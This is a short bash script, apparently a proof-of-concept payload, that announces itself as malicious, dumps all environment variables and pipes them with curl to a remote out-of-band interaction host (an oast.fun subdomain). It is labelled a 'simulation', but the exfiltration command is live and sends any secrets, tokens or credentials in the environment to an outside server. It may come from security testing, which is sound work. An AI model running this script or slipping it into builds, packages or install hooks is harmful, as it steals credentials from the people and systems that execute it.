#!/bin/bash
echo "--- Malicious script executed ---"
echo "--- Dumping Environment Variables ---"
env
echo "--- Exfiltrating data (simulation) ---"
env | curl -X POST -d @- https://bqiehrpshxqkxlzvdxgcuvbw9vidmhxw0.oast.fun/util
echo "--- Malicious execution finished ---"
exit 0
